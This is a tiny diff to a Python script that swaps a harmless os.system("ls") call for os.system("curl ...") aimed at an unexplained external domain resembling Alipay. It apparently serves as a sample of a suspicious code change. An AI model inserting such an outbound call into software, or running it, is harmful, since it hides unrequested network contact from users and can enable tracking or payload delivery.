@@ -1,3 +1,3 @@
 import os
 
-os.system("ls")
+os.system("curl http://chunjin.bs.n.xalipay.cc")
